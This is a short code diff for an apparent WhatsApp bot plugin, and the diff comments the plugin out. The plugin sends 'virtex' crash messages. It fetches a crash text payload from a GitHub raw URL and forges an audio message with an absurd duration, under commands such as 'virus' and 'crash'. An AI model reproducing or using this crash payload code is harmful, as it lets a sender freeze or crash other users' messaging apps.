@@ -1,4 +1,4 @@
-import fetch from 'node-fetch'
+/*import fetch from 'node-fetch'
 let handler = async (m, { conn, text, args }) => {
 const estiloaudio = { key: {  fromMe: false, participant: `05675@s.whatsapp.net`, ...(m.chat ? { remoteJid: "5219992606@g.us" } : {}) }, message: {"audioMessage": { "mimetype":"audio/ogg; codecs=opus", "seconds": "995576878678657856785678567856785678768757876856769", "ptt": "true"}}}  
 let virtex = await fetch('https://raw.githubusercontent.com/Caliph91/txt/main/pirtex/1.txt').then(v => v.text());
@@ -16,3 +16,4 @@ conn.sendPresenceUpdate('recording', m.chat)}
 handler.command = ['virus1', 'c1', 'binario1', 'traba1', 'crash1', 'virus', 'binario', 'traba', 'crash'] 
 handler.rowner = true
 export default handler
+*/
